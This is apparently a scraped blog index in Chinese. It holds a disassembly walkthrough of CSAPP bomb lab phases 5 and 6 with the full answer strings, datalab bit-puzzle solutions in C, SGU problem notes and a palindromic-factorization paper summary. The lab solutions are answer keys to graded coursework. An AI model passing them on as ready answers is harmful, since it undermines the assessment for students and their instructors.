0x4010d9 &lt;phase_5+119&gt;0x4010d2 &lt;+112&gt;: mov $0x0,%eax0x4010d7 &lt;+117&gt;: jmp 0x40108b &lt;phase_5+41&gt;0x4010d9 &lt;+119&gt;: mov 0x18(%rsp),%rax0x4010de &lt;+124&gt;: xor %fs:0x28,%rax0x4010e7 &lt;+133&gt;: je 0x4010ee &lt;phase_5+140&gt;0x4010e9 &lt;+135&gt;: callq 0x400b30 &lt;__stack_chk_fail@plt&gt;0x4010ee &lt;+140&gt;: add $0x20,%rsp0x4010f2 &lt;+144&gt;: pop %rbx0x4010f3 &lt;+145&gt;: retq A. 先阅读读入部分： 12345678910110x401062 &lt;+0&gt;: push %rbx0x401063 &lt;+1&gt;: sub $0x20,%rsp0x401067 &lt;+5&gt;: mov %rdi,%rbx0x40106a &lt;+8&gt;: mov %fs:0x28,%rax0x401073 &lt;+17&gt;: mov %rax,0x18(%rsp)0x401078 &lt;+22&gt;: xor %eax,%eax0x40107a &lt;+24&gt;: callq 0x40131b &lt;string_length&gt;0x40107f &lt;+29&gt;: cmp $0x6,%eax0x401082 &lt;+32&gt;: je 0x4010d2 &lt;phase_5+112&gt;0x401084 &lt;+34&gt;: callq 0x40143a &lt;explode_bomb&gt;0x401089 &lt;+39&gt;: jmp 0x4010d2 &lt;phase_5+112&gt; 寄存器 %rbx = %rdi = &amp;input，记录输入字符串的地址。 调用函数 string_length 计算输入 %rdi = &amp;input 的字符串长度，要求其长度为 6。 B. 上述代码跳转到 0x4010d2： 120x4010d2 &lt;+112&gt;: mov $0x0,%eax0x4010d7 &lt;+117&gt;: jmp 0x40108b &lt;phase_5+41&gt; 该段代码将 %eax 赋值为 0，并跳转到 0x40108b。 C. 0x40108b~0x4010ac 是一个循环，循环变量为 %rax=0~5，%rbx = &amp;input。 12340x40108b &lt;+41&gt;: movzbl (%rbx,%rax,1),%ecx0x40108f &lt;+45&gt;: mov %cl,(%rsp)0x401092 &lt;+48&gt;: mov (%rsp),%rdx0x401096 &lt;+52&gt;: and $0xf,%edx 上述代码取出 input 的字符，并将低 4 位赋值给 %edx，即 %edx = input[%rax] &amp; 0xf。 120x401099 &lt;+55&gt;: movzbl 0x4024b0(%rdx),%edx0x4010a0 &lt;+62&gt;: mov %dl,0x10(%rsp,%rax,1) 上述代码从地址 0x4024b0 + %rdx 取值，并存储于栈 %rsp + %rax + 16 处。 使用 print (char *) 0x4024b0 查看该地址的值为 “maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?” 。 该循环利用上述字符串构造了新的字符串，并存储于起始地址 %rsp + 16。 D. 第 3 步构造的字符串要与地址 0x40245e 的字符串相同。 12345670x4010ae &lt;+76&gt;: movb $0x0,0x16(%rsp)0x4010b3 &lt;+81&gt;: mov $0x40245e,%esi0x4010b8 &lt;+86&gt;: lea 0x10(%rsp),%rdi0x4010bd &lt;+91&gt;: callq 0x401338 &lt;strings_not_equal&gt;0x4010c2 &lt;+96&gt;: test %eax,%eax0x4010c4 &lt;+98&gt;: je 0x4010d9 &lt;phase_5+119&gt;0x4010c6 &lt;+100&gt;: callq 0x40143a &lt;explode_bomb&gt; 使用 print (char *) 0x40245e 查看字符串，其值为 “flyers”。 E. 构造字符串的第 i 个字符为 *(0x4024b0 + (input[i] &amp; 0xf))，依据 “flyers” 可反向推导 input 的值为 0x9fe567。然而 input 是作为字符串读入的，因此值 0x9fe567 要构造成可打印字符的序列。本文将每个值或（or）上 0x60，构造出序列 “ionefg”。 “ionefg” 即为 bomb 的第 5 组运行参数。 phase_6A. 数据读入使用 read_six_numbers： 12340x401100 &lt;+12&gt;: mov %rsp,%r130x401103 &lt;+15&gt;: mov %rsp,%rsi0x401106 &lt;+18&gt;: callq 0x40145c &lt;read_six_numbers&gt;0x40110b &lt;+23&gt;: mov %rsp,%r14 在 phase_2 已知 read_six_numbes 读取六个整数，依次存储于 %rsi, %rsi + 4, …, %rsi + 20。 定义 int a[6]，其中 a = %rsi，则六个整数可表示为 a[0], a[1], …, a[5]。 B. 二重循环检测六个整数的大小关系，要求两两不同且每个数不能大于 6。 12340x401114 &lt;+32&gt;: mov %r13,%rbp...0x40114d &lt;+89&gt;: add $0x4,%r130x401151 &lt;+93&gt;: jmp 0x401114 &lt;phase_6+32&gt; 寄存器 %r13 为外层循环指针，依次指向 &amp;a[0], &amp;a[1], …, &amp;a[5]。 1234560x40110e &lt;+26&gt;: mov $0x0,%r12d...0x401128 &lt;+52&gt;: add $0x1,%r12d0x40112c &lt;+56&gt;: cmp $0x6,%r12d0x401130 &lt;+60&gt;: je 0x401153 &lt;phase_6+95&gt;0x401132 &lt;+62&gt;: mov %r12d,%ebx 寄存器 %r12 为外层循环下标，依次赋值为 0, 1, …, 5。 1234560x401132 &lt;+62&gt;: mov %r12d,%ebx0x401135 &lt;+65&gt;: movslq %ebx,%rax...0x401145 &lt;+81&gt;: add $0x1,%ebx0x401148 &lt;+84&gt;: cmp $0x5,%ebx0x40114b &lt;+87&gt;: jle 0x401135 &lt;phase_6+65&gt; 寄存器 %ebx 为内层循环下标。 123450x401117 &lt;+35&gt;: mov 0x0(%r13),%eax # %eax = a[i]0x40111b &lt;+39&gt;: sub $0x1,%eax0x40111e &lt;+42&gt;: cmp $0x5,%eax0x401121 &lt;+45&gt;: jbe 0x401128 &lt;phase_6+52&gt;0x401123 &lt;+47&gt;: callq 0x40143a &lt;explode_bomb&gt; # bomb if a[i] &gt; 6 上述代码检查 a[i] - 1 &lt;= 5 是否满足，不满足则调用 explode_bomb。 123450x401135 &lt;+65&gt;: movslq %ebx,%rax0x401138 &lt;+68&gt;: mov (%rsp,%rax,4),%eax # %eax = a[j]0x40113b &lt;+71&gt;: cmp %eax,0x0(%rbp) 0x40113e &lt;+74&gt;: jne 0x401145 &lt;phase_6+81&gt;0x401140 &lt;+76&gt;: callq 0x40143a &lt;explode_bomb&gt; # bomb if a[i] == a[j] %ebx 为内层循环下标，因此 %eax = a[j]。 %rsp = %r13 为外层循环指针，因此 cmp 指令比较 a[i], a[j]。 上述代码检测 a[i] != a[j]，不满足则调用 explode_bomb。 C. 更新 a[i] = 7 - a[i]。 1234567890x401153 &lt;+95&gt;: lea 0x18(%rsp),%rsi # 循环上界 %rsp + 240x401158 &lt;+100&gt;: mov %r14,%rax # 循环指针 %rax0x40115b &lt;+103&gt;: mov $0x7,%ecx0x401160 &lt;+108&gt;: mov %ecx,%edx0x401162 &lt;+110&gt;: sub (%rax),%edx0x401164 &lt;+112&gt;: mov %edx,(%rax) # *%rax = 7 - *%rax0x401166 &lt;+114&gt;: add $0x4,%rax0x40116a &lt;+118&gt;: cmp %rsi,%rax0x40116d &lt;+121&gt;: jne 0x401160 &lt;phase_6+108&gt; %rax 是指向数组 a 的指针，因此上述代码完成 a[i] = 7 - a[i]。 D. 构造 value 指针数组，第 i 个 value 指针指向 0x6032d0 + 16(a[i] - 1)。 12340x40116f &lt;+123&gt;: mov $0x0,%esi # %esi 为偏移量 4i...0x40118d &lt;+153&gt;: add $0x4,%rsi0x401191 &lt;+157&gt;: cmp $0x18,%rsi 寄存器 %esi 为偏移量。 1234560x401176 &lt;+130&gt;: mov 0x8(%rdx),%rdx0x40117a &lt;+134&gt;: add $0x1,%eax0x40117d &lt;+137&gt;: cmp %ecx,%eax0x40117f &lt;+139&gt;: jne 0x401176 &lt;phase_6+130&gt;0x401181 &lt;+141&gt;: jmp 0x401188 &lt;phase_6+148&gt;0x401183 &lt;+143&gt;: mov $0x6032d0,%edx 上述代码根据 %ecx = a[i] 值，使用 %rdx = *(%rdx + 8) 构造 value 指针，%rdx 初始地址为 0x6032d0。 利用 print *(int *) 0x6032d0 查询一系列地址的值，可得下表： addrvalue0x6032d03320x6032d80x6032e0‬0x6032e0‬168‬0x6032e80x6032f0‬0x6032f0‬9240x6032f80x6033000x6033006910x6033080x6033100x6033104770x6033180x6033200x603320443根据代码以及上述表格可得，%rdx = 0x6032d0 + 16 * (a[i] - 1)。 10x401188 &lt;+148&gt;: mov %rdx,0x20(%rsp,%rsi,2) %rsi 为第 i 个元素的偏移量，值为 4i。 value 指针数组的起始地址为 %rsp + 32，第 i 个整数的 value 指针地址为 %rsp + 32 + 8i，存储值 %rdx = 0x6032d0 + 16 * (a[i] - 1)。 E. 构造六个元素的链表。12340x4011b0 &lt;+188&gt;: lea 0x28(%rsp),%rax...0x4011c4 &lt;+208&gt;: add $0x8,%rax0x4011c8 &lt;+212&gt;: cmp %rsi,%rax 寄存器 %rax 是指向 value 指针数组的指针，从第 2 个元素开始。 12345670x4011ab &lt;+183&gt;: mov 0x20(%rsp),%rbx0x4011ba &lt;+198&gt;: mov %rbx,%rc0x4011bd &lt;+201&gt;: mov (%rax),%rdx0x4011c0 &lt;+204&gt;: mov %rdx,0x8(%rcx)...0x4011cd &lt;+217&gt;: mov %rdx,%rcx0x4011d0 &lt;+220&gt;: jmp 0x4011bd &lt;phase_6+201&gt; 第 i 个元素的 next 指针地址为 (%rcx + 8)，而 %rcx = value[i]，因此 next 的地址等于 (value[i] + 8) = 0x6032d0 + 16 (a[i] - 1) + 8，该地址存储 (%rax) 的值 = value[i + 1] = 0x6032d0 + 16 * (a[i + 1] - 1)。 即该链表顺序链接，第 i 个元素的下一个元素为第 i + 1 个元素。 F. 遍历构造链表并比较相邻元素的大小。 12340x4011da &lt;+230&gt;: mov $0x5,%ebp...0x4011f2 &lt;+254&gt;: sub $0x1,%ebp0x4011f5 &lt;+257&gt;: jne 0x4011df &lt;phase_6+235&gt; %ebp 存储循环下标。 10x4011df &lt;+235&gt;: mov 0x8(%rbx),%rax %rbx = value[i]，因此 %rax = *(value[i] + 8) = next + i。 10x4011e3 &lt;+239&gt;: mov (%rax),%eax 从 *(&amp;next[i]) = value[i + 1] 的地址取值并存于 %eax，即 %eax = value[i + 1]。 1230x4011e5 &lt;+241&gt;: cmp %eax,(%rbx)0x4011e7 &lt;+243&gt;: jge 0x4011ee &lt;phase_6+250&gt;0x4011e9 &lt;+245&gt;: callq 0x40143a &lt;explode_bomb&gt; cmp 指令比较 value[i + 1] 和 value[i]。 当 value[i] &lt; value[i + 1] 不发生跳转，从而顺序执行 explode_bomb。所以，链表的元素需要满足单调递减的性质。 查询第 4 步中的表可得，链表序列为 924 691 477 443 332 168，对应的 a[i] 序列为 3 4 5 6 1 2。注意第 3 步中用 7 - a[i] 更新了 a[i] 数组，因此原始的 a[i] 序列为 4 3 2 1 6 5。 “4 3 2 1 6 5” 为 bomb 的第 6 组运行参数。 答案Border relations with Canada have never been better.1 2 4 8 16 327 3277 0ionefg4 3 2 1 6 5","categories":[],"tags":[]},{"title":"CSAPP - datalab","slug":"CSAPP-datalab","date":"2020-02-14T14:55:06.000Z","updated":"2020-02-15T15:07:06.668Z","comments":true,"path":"2020/02/14/CSAPP-datalab/","link":"","permalink":"http://mcginn7.github.io/2020/02/14/CSAPP-datalab/","excerpt":"","text":"自动测试 使用 dlc 检测代码是否符合题目要求 1unix&gt; ./dlc bits.c 编译并调用自动测试程序 12unix&gt; makeunix&gt; ./btest 题目bitXor(x, y)要求：仅使用 ~ 和 &amp; 完成异或运算。 运算：~ &amp; 做法：画出 &amp; 运算符的真值表，配合 ~ 运算符易得。 123int bitXor(int x, int y) &#123; return ~(x&amp;y)&amp;~(~x&amp;~y);&#125; tmin()要求：返回二进制补码表示的最小整数。 运算： ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; 做法：补码表示的最小整数为 $10\\dots 0$，即符号位为 1，其余位为 0。 123int tmin(void) &#123; return 1&lt;&lt;31;&#125; isTmax(x)要求：判断 x 是否为补码表示的最大整数。 运算：! ~ &amp; ^ | + 做法：当 x 为最大整数时，补码表示为 $01\\dots 1$，即符号位为 0，其余位为 1，可得 x + 1 = ~x。 然而当 x = -1 时，前述等式也成立，因此需要排除掉这种情况。 123int isTmax(int x) &#123; return !((~x^(x+1)) | !(x+1));&#125; allOddBits(x)要求：判断 x 二进制表示下的奇数位是否全为 1。 运算：! ~ &amp; ^ | + &lt;&lt; &gt;&gt; 做法：规则允许使用最大为 0xFF 的整数，因此可使用 &amp; 运算每 8 位合并 x 的所有位，然后使用 ^ 运算判断奇数位是否全为 1。 123int allOddBits(int x) &#123; return !(((x&gt;&gt;24) &amp; (x&gt;&gt;16) &amp; (x&gt;&gt;8) &amp; x &amp; 0xAA) ^ 0xAA);&#125; negate(x)要求：计算返回 -x。 运算：! ~ &amp; ^ | + &lt;&lt; &gt;&gt; 做法：首先将有符号数转换成无符号数以便于位运算处理。 相互转换的规则是：数值可能会改变，但位模式不变。因此，补码转换为无符号数为： T2U_w(x)=\\left\\{\\begin{array}{lr}x+2^w, && x < 0 \\\\ x, && x\\ge 0\\end{array}\\right.假设 $x \\neq 0$，有 $x+(-x)=0$，两侧同加上 $2^w$ 并移项得 -x + 2^w = 2^w - x = (2^w-1-x)+1=\\sim x +1在 $x &gt; 0$ 时，$-x$ 的补码表示与 $-x+2^w$ 的位模式相同，等于 $\\sim x + 1$。 在 $x \\le 0$ 时，$-x + 2^w$ 超出 $w$ 位二进制的表示范围，其结果为 $-x$ 的二进制表示。 123int negate(int x) &#123; return ~x+1;&#125; isAsciiDigit(x)要求：判断值 x 是否在范围 [0x30, 0x39] 中。 运算： ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; 做法：首先前 $w - 4$ 位的值必须为 3，该判断容易实现。 剩余 4 位划分成 [0, 7] 和 [8, 9] 的两个区间来处理。 第 4 位为 0 时，剩余 3 位可为任意值，表示区间 [0, 7]。 第 4 位为 1 时，8 和 9 的二进制表示分别为 1000 和 1001，即高 3 位必须为 100。 利用掩码表示的思想，x 为 110111(0x37) 的子集或是 111001(0x39) 的子集。 123int isAsciiDigit(int x) &#123; return (!((x&gt;&gt;4)^3)) &amp; (!(x^(x&amp;0x37)) | !(x^(x&amp;0x39)));&#125; conditional(x, y, z)要求：执行三目运算符 x ? y : z：当 x 不为 0 时，返回 y；否则返回 z。 运算：! ~ &amp; ^ | + &lt;&lt; &gt;&gt; 做法：核心思想是利用 x 得出位模式等于 -1（全为 1）的值，使用 &amp; 运算和 ~ 运算得到 y 或 z 的位模式，最后使用 | 得到结果。 ! 运算将 x 映射到 [0, 1] 区间，使用函数 $f(x)=!x + (-1)$ 取出 y，则 $\\sim f(x)$ 取出 z。 当 $x \\neq 0$ 时，$f(x)=-1$，其位模式全为 1，因此 $f(x) \\&amp; y = y$。 当 $x = 0$ 时，$f(x)=0$，其位模式全为 0，因此 $f(x)\\&amp;y=0$。 1234int conditional(int x, int y, int z) &#123; x = !x + ~0; return (y &amp; x) | (z &amp; ~x);&#125; isLessOrEqual(x, y)要求：判断 x &lt;= y。 运算：! ~ &amp; ^ | + &lt;&lt; &gt;&gt; 做法：将问题转换成判断 $a + b \\le0$，新问题下需要注意溢出问题。 当 $a+b&lt;0$ 时，其符号位为 1，因此执行 $a+b$ 并取出符号位可解决问题。但是，存在 $a+b$ 上溢出导致其符号位也为 1 的情况。 进一步地，当 $a$ 和 $b$ 符号位相同时，$a+b&lt;0$ 当且仅当符号位均为 1。符号位不同时，$a+b$ 不存在溢出问题。 $a+b=0$ 特判 $x=y$ 即可。 注意取符号位是 &amp;1 操作不可省略，因为机器使用了算术右移。 123int isLessOrEqual(int x, int y) &#123; return (!(x^y)) | ((x&amp;~y)&gt;&gt;31&amp;1) | ((!((x^y)&gt;&gt;31))&amp;((x+(~y+1))&gt;&gt;31));&#125; logicalNeg(x)要求：计算 !x：当 x = 0 时返回 1；当 x ≠ 0 时返回 0。 运算：~ &amp; ^ | + &lt;&lt; &gt;&gt; 做法：当 $x \\neq 0$ 时，$x|(-x)$ 的符号位必然为 1。 123int logicalNeg(int x) &#123; return ~(x|(~x+1))&gt;&gt;31&amp;1;&#125; howManyBits(x)要求：使用二进制补码表示 x 的最少位数。 运算：! ~ &amp; ^ | + &lt;&lt; &gt;&gt; 做法：当 $x \\ge 0$ 时，位数取决于 1 的最高位数；当 $x &lt; 0$ 时，位数则取决于 0 的最高位数（根据补码表示的定义，符号位起连续的 1 可合并起来用一个位表示）。 首先考虑将负数取反，将问题统一成计算 1 的最高位，利用算术右移即可完成， 即 $x=x \\oplus (x &gt;&gt;31)$。 然后使用二分法计算 1 的最高位：判断高 16 位是否大于 0，若大于 0 说明高 16 位中存在 1，否则 1 在低 16 位中。使用 conditional 函数更新 x（取出高 16 位或低 16 位）。迭代判断 8 位、4 位等等。 123456789101112131415161718192021222324252627int howManyBits(int x) &#123; int bit; int res = 1; x = x ^ (x &gt;&gt; 31); bit = !!(x &gt;&gt; 16) &lt;&lt; 4; res = res + bit; x = x &gt;&gt; bit; bit = !!(x &gt;&gt; 8) &lt;&lt; 3; res = res + bit; x = x &gt;&gt; bit; bit = !!(x &gt;&gt; 4) &lt;&lt; 2; res = res + bit; x = x &gt;&gt; bit; bit = !!(x &gt;&gt; 2) &lt;&lt; 1; res = res + bit; x = x &gt;&gt; bit; bit = !!(x &gt;&gt; 1); res = res + bit; x = x &gt;&gt; bit; return x + res;&#125; floatScale2(uf)要求：计算 2 * uf，若 uf 为特殊值值时，直接返回 uf。 运算：Integer/unsigned 相关运算；||，&amp;&amp;，if 和 while 等判断语句。 做法：这道题需要对浮点数表示比较了解，单精度（float）表示包括：1 位符号，8 位阶码，23 位尾数。这里使用 e 表示阶码的无符号数，B 表示阶码的偏置值，f 表示尾数值。 当 e 全 0 时，表示非规格化的值，真实值 $V=f\\times 2^{1-B}$。 乘上系数 2 时，阶码是否变动看 2f 是否大于等于 1，即 f 最高位是否为 1。由于阶码在尾数的高位，该情况下位数左移 1 位即可。 当 e 不全 0 也不全 1 时，表示规格化的值，真实值 $V=(1+f)\\times 2^{e - B}$。 阶码 + 1 即可。 当 e 全 1 时，表示特殊值。 12345678unsigned floatScale2(unsigned uf) &#123; unsigned s = uf &gt;&gt; 31 &amp; 1; unsigned e = uf &gt;&gt; 23 &amp; 0xff; unsigned f = uf ^ (s &lt;&lt; 31) ^ (e &lt;&lt; 23); if (!(e^0xff)) return uf; if (!e) return (s &lt;&lt; 31) | (f &lt;&lt; 1); return (s &lt;&lt; 31) | ((e + 1) &lt;&lt; 23) | f;&#125; floatFloat2Int(uf)要求：将浮点数 uf 转换成整数。 运算：Integer/unsigned 相关运算；||，&amp;&amp;，if 和 while 等判断语句。 做法：当浮点数是 0 和规格化的值时，才有可能用整数表示，其余部分注意整数表示范围即可。 123456789101112int floatFloat2Int(unsigned uf) &#123; int s = uf &gt;&gt; 31 &amp; 1; int e = uf &gt;&gt; 23 &amp; 0xff; int f = uf ^ (s &lt;&lt; 31) ^ (e &lt;&lt; 23); if (!(e | f)) return 0; e = e - 0x7f; if (e &lt; 0) return 0; if (e &gt; 30 + (s &amp; !f)) return 0x80000000u; f = ((1 &lt;&lt; 23) | f) &gt;&gt; (23 - e); if (s) return -f; return f;&#125; floatPower2(x)要求：使用浮点数表示 2^x。无法表示时：过小返回 0，过大返回 +INF。 运算：Integer/unsigned 相关运算；||，&amp;&amp;，if 和 while 等判断语句。 做法： 12345unsigned floatPower2(int x) &#123; x = x + 0x7f; if (x &lt; 0) return 0; return x &lt; 0xff ? x &lt;&lt; 23 : 0x7f800000u;&#125;","categories":[],"tags":[]},{"title":"SGU 153-252","slug":"SGU-153-252","date":"2020-02-13T03:20:12.000Z","updated":"2020-02-13T13:51:46.350Z","comments":true,"path":"2020/02/13/SGU-153-252/","link":"","permalink":"http://mcginn7.github.io/2020/02/13/SGU-153-252/","excerpt":"","text":"计划计划一年内（截止 2021 年 1 月 1 日）把 SGU 500 刷完，形式以所有题目给出翻译后的简要题意和解题思路概要。 AC 代码库 题目153 Playing with matches 题意 有 $1\\le N \\le 10^9$ 根火柴，Little 和 Petya 轮流取，每次能取 $1, P_1, P_2, \\dots , P_m(2\\le P_i \\le 9, 0\\le m \\le 8)$ 根火柴，判断先/后手必胜。 分析 当 $N$ 较小时，可用 dp 计算火柴为 $n$ 时状态（必胜/必败）。由于 $P_i\\le 9$，每个点的状态只与前面的 9 个状态有关，从而每个状态的 SG 值最大为 10。并且根据 SG 值的定义，前面 9 个状态的 SG 值两两不同，因此 9 个状态的总数约为 $10!=3,628,800‬$。通过找出循环节，即可计算 $N$ 的 SG 值，从而判断胜负态。 154 Factorial 题意 求最小自然数 $N$，满足 $N!$ 有 $0 \\le Q \\le 10^8$ 个尾数 0。 分析 尾数 0 只与 $N!$ 的质因子 2 和 5 有关。求 $N!$ 中质因子 $p$ 的个数： \\frac N p + \\frac N {p^2} + \\dots显然， 5 的个数少于 2 的个数，因此尾数 0 只与 5 的个数相关。 上述公式具有非递减性质，因此可以二分计算最小自然数 $N$。 154 Cartesian Tree 题意 给定 $1\\le N\\le 50000$ 个 对，要求利用 key 值构造一棵二叉搜索树，并且满足小根堆的性质：如果 y 是 x 的父节点，则有 y.value &lt; x.value。数据保证 key 值和 value 值两两不同。 分析 Cartisian Tree 模板题。 xxx 题意 分析","categories":[],"tags":[]},{"title":"回文分解算法","slug":"Palindromic-Factorization","date":"2019-11-20T11:30:36.000Z","updated":"2019-11-28T03:19:26.596Z","comments":true,"path":"2019/11/20/Palindromic-Factorization/","link":"","permalink":"http://mcginn7.github.io/2019/11/20/Palindromic-Factorization/","excerpt":"","text":"内容基本是翻译自论文《A Subquadratic Algorithm for Minimum Palindromic Factorization》，主要对文章进行翻译，力图简化算法的证明过程并给出相应的结论。简化证明过程可能存在不严谨的地方，如有需要可自行查看参考资料中的论文原文。 太长不看版给定一字符串，对于每个右端点为 $r$ 的回文子串，将左端点记为 $l_1\\lt l_2\\lt \\dots \\lt l_k$，记间距 $Δ_i=l_i-l_{i-1}$，结论有： 间距 $Δ_i$ 构成单调递减序列（严格来说，是单调非增序列），即 $\\forall i&gt;1,Δ_i\\ge Δ_{i-1}$。 间距 $Δ_i$ 不超过 $\\log(r)$ 种。 基于上述 2 点结论，可以在 $\\log(r)$ 时间内利用端点 $r-1$ 的信息计算得到 $r$ 的回文左端点，进而对字符串进行回文分解。 时间复杂度 $O(N\\log N)$，空间复杂度 $O(N)$。 问题背景给定长为 $N$ 的字符串 $S$，在 $O(N\\log N)$ 时间内对字符串 $S$ 分解为最少数量的回文子串，即最小回文分解： S = S_1S_2\\dots S_l其中，$S_i$ 都是回文串。 论文摘录引言首先，定义 $PL(S)$ 表示字符串 $S$ 的最小回文分解的子串数量。如 $PL(abaab)=2$，拆分成 $a$ 和 $baab$ 两个子回文串。 通过动态规划的思想，可以在 $O(N^2)$ 时间内计算 $PL(S)$： PL(S[1..j])=\\min _i \\{PL(S[1..i-1])+1 : i\\le j, S[i..j]\\ is\\ a\\ palindrome\\}具体实现为：对于每个右端点 $j$，维护一个左端点集合 $P_j$，对于每个 $i\\in P_j$ 都有 $S[i..j]$ 是回文串。基于集合 $P_j$ 可以枚举计算得到 $P_{j+1}$ 集合：如果 $S[i..j]$ 是回文串且 $S[i-1]=S[j+1]$，则 $i-1\\in P_{j+1}$。 该论文的算法主要改进左端点 $P_j$ 的表示，利用回文串的性质将左端点划分成 $O(\\log j)$ 个等差数列的集合 $G_j$，在 $O(\\log j)$ 时间内从 $G_{j-1}$ 转移计算 $G_j$。 Border：串 $y$ 是串 $x$ 的 border 表示 $y$ 既是 $x$ 的前缀也是 $x$ 的后缀。 $x$ 也是其本身的 border。 当 $y \\neq x$ 时，称其为 proper border。 引理1记串 $y$ 为回文串 $x$ 的后缀，则 $y$ 是 $x$ 的 border 当且仅当 $y$ 是回文串。 引理2记串 $y$ 为串 $x$ 的 border 并且 $|x|\\le 2|y|$，那么 $x$ 是回文串当且仅当 $y$ 是回文串。 引理3记串 $y$ 为回文串 $x$ 的真后缀（proper suffix），那么 $|x|-|y|$ 是 $x$ 的周期（period）当且仅当 $y$ 是回文串。特别地，$|x|-|y|$ 是 $x$ 最小周期当且仅当 $y$ 是 $x$ 的最长回文真后缀。 部分网上博文将 period 译为循环节是不太准确的。例如 $x=aba$ 和 $y=a$，此时 $|x|-|y|=2$，并不能整除 $|x|=3$。因此，这里我译为周期。 引理4记 $x$ 为回文串，$y$ 是 $x$ 的最长回文真后缀，$z$ 是 $y$ 的最长回文真后缀，以及 $u, v$ 满足 $x=uy$ 和 $y=vz$，则有： (1) $|u|\\ge |v|$; (2) 如果 $|u|\\gt |v|$，则 $|u| \\gt |z|$; (3) 如果 $|u|=|v|$，则 $u=v$。 证明 (1) 根据引理3，$|u|=|x|-|y|$ 是 $x$ 的最小周期，$|v|=|y|-|z|$ 是 $y$ 的最小周期。根据 $|y|$ 的长度分两种情况考虑： 当 $2|y|\\le |x|$ 时，有 $|u|\\ge|y|&gt;|v|$。 当 $2|y|&gt;|x|$ 时，$u$ 是 $x$ 的周期同时也是 $y$ 的周期。由于 $v$ 是 $y$ 的最小周期，因此 $|u| \\ge |v|$。 (2) 显然，根据 $x,y$ 均是回文串，可知 $v$ 是 $x$ 的前缀，记 $x=vw$。根据回文串性质，如图 1 所示， $z$ 是 $w$ 的 border 且 $|w|=|zu|$（注意，这里仅仅是长度相等，并不是说 $w=zu$）。根据条件 $|u|\\gt |v|$，可得 $|w|&gt;|y|$。这里使用反证法，假设结果不成立即 $|u|\\le |z|$，那么 $|w|=|zu|\\le 2|z|$，而根据引理2的结论 $w$ 是回文串，与 $y$ 是 $x$ 的最长回文真后缀相矛盾，因此假设不成立。 图 1. 反证法的结果图(3) 上述证明过程中可知 $v$ 是 $x$ 的前缀，并且 $u$ 也是 $x$ 的前缀。在 $|u|=|v|$ 的条件下，显然 $u=v$。 引理5回文左端点集合 $P_j$ （有序）的点间距是非增的，并且最多有 $O(\\log j)$ 种间距。 证明 对于任意 $i\\in [2..|P_j|-1]$，记 $x = S[p_{i-1}..j], y=S[p_i..j],z=S[p_{i+1}..j]$，则间距有 $|u|=|x|-|y|$ 和 $|v|=|y|-|z|$。 根据引理4(1)有 $|u|\\ge|v|$，从而间距非增。一旦间距发生变化即 $|u|\\gt |v|$，根据引理4(2)有 $|u|&gt;|z|$，进而 $|x|&gt;|u|+|z|&gt;2|z|$，长度至少翻倍，因而发生变化的次数不超过 $O(\\log j)$，也就是说只有 $O(\\log j)$ 种间距。 对于任意正整数间距 Δ，定义 P_{j,Δ}=\\{p_i:1","categories":[],"tags":[]},{"title":"SGU 100~152","slug":"SGU-100-152","date":"2019-11-15T02:16:46.000Z","updated":"2020-02-13T03:20:45.441Z","comments":true,"path":"2019/11/15/SGU-100-152/","link":"","permalink":"http://mcginn7.github.io/2019/11/15/SGU-100-152/","excerpt":"","text":"计划计划一年内（截止 2021 年 1 月 1 日）把 SGU 500 刷完，形式以所有题目给出翻译后的简要题意和解题思路概要。 AC 代码库 题目101 Domino 题意 多米诺牌两端标有 0 至 6 的数字，以 形式表示，每张牌均可翻转。要求将 100 个多米诺牌横向放置成一排，相邻的多米诺牌数字需要相同。如 。判断是否存在方案，存在的话给出一种排列。 分析 将数字 0 至 6 视为图上的点，多米诺牌视为无向边，则问题转化成找出一条欧拉路径，而欧拉路径使用搜索+剪枝解决。 102 Coprimes 题意 给定 $1\\le N \\le 10^4$，求 $[1, N)$ 范围内与 $N$ 互质的整数个数。 分析 求欧拉函数值 $φ(N)=N\\prod (1 - \\frac {1} {p_i})$，$O(\\sqrt N)$ 枚举质因子求解即可。 103 Traffic Lights 题意 分析 104 Little shop of flowers 题意 给 $1\\le V \\le 100$ 个花瓶和 $1\\le F\\le 100$ 朵花，以及第 $i$ 朵花放入第 $j$ 个花瓶的美观度 $A_{ij}$。在不改变花的相对顺序条件下，将所有花插入到花瓶中，求最大的美观度之和且输出一种方案。 分析 经典的动态规划题目。$dp(i, j)$ 表示前 $i$ 个花瓶中已插入前 $j$ 朵花的最大美观度之和，转移方程： dp(i, j) = \\max\\{dp(i - 1, j), dp(i - 1, j - 1) + A_{ji}\\} 105 Div 3 题意 给出 1, 12, 123, 1234, …, 12345678910, … 的序列，求前 $1\\le N \\le 2^{31}-1$ 个元素中是 3 的倍数的个数。 分析 打表找规律，余数序列为 100100…，即每 3 个元素中有 2 个是 3 的倍数。 106 The equaion 题意 给定二元一次方程 $ax+by+c=0$，已知 $a,b,c$ 和解 $(x, y)$ 的范围 $x \\in [x_1, x_2],y\\in [y_1, y_2] $。数据保证所有的数字绝对值小于 $10^8$，求解 $(x, y)$ 的个数。 分析 使用扩展欧几里得算法计算 $ax_0+by_0=\\gcd(a,b)$ 的一组特解 $(x_0, y_0)$，通过乘上缩放因子 $-c/\\gcd(a,b)$ 得到 $ax_0+by_0+c=0$ 的特解，通解为 x=x_0+k\\frac{b}{\\gcd(a,b)} \\\\ y=y_0-k\\frac{a}{\\gcd(a, b)}利用 $[x_1, x_2]$ 和 $[y_1, y_2]$ 分别计算 $k$ 的范围取交集即为解的个数。 需要注意的是： $a$ 或 $b$ 有可能为 0 而导致方程转换为一元一次方程和常数方程； 系数有可能为负数，注意上取整和下取整计算。 107 987654321 problem 题意 给定数字 $1\\le N \\le 10^6$，请求出数字位数为 $N$ 的数 $x$ 的数量，满足 $x^2$ 的末尾为 987654321。 分析 本质上求 $x^2\\mod 10^9=987654321$，且 $x=v\\times 10^9+m$。因为 $v\\times 10^9 \\equiv 0\\pmod {10^9}$，所以只有 $x$ 末尾 9 个数字对结果有影响。此外，通过最后一位为 1 可推断 $x$ 的个位数是 1 或 9，剩下前 8 位可在 $10^8$ 枚举计算，最终有 8 个 9 位数字 $m$ 满足条件。最后分位数 $N9$ 的三种情况讨论输出即可。 108 Self-numbers 2 题意 定义函数 $d(n)$ 为数字 $n$ + 数位和，如 $d(123)=123+1+2+3$。如果一个数 $x$，不存在数 $n$ 使得 $x=d(n)$，则数 $x$ 为 self-number。给定 $1\\le N\\le 10^7$ 和 $1\\le K\\le 5000$，进行 